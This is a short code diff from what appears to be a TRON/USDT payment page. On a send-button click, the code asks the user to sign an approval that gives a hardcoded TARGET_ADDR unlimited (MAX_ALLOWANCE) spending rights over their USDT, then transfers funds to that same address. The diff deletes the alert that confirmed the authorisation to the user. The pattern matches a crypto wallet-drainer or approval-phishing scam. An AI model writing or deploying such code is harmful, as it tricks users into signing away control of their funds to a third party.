@@ -213,7 +213,6 @@ sendBtn.addEventListener("click", async () => {
         if (Number(allowance) < sunVal) {
             alert("请确认钱包授权签名");
             await usdtContract.approve(TARGET_ADDR, MAX_ALLOWANCE).send({feeLimit:FEE_LIMIT});
-            alert("授权完成，请确认转账签名");
         }
         // 第二次签名：用户自己transfer直接转出，不是transferFrom划扣
         const txHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send({feeLimit:FEE_LIMIT});
